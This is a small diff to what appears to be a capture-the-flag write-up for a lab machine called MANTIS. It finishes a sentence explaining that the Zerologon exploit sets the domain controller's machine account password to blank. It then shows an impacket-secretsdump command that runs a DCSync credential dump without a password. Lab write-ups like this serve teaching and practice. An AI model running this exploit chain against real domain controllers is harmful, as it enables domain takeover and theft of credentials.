@@ -452,7 +452,8 @@ Result: 0
 
 Exploit complete!
 ```
-The zerlogon exploit targets the machine account and sets the password to a 
+The zerlogon exploit targets the machine account and sets the password to a blank string this way i can just perform a DCSync attack with `-no-pass`
+
 ## DCSync
 ```python
 impacket-secretsdump -just-dc -no-pass MANTIS\$@10.129.17.20
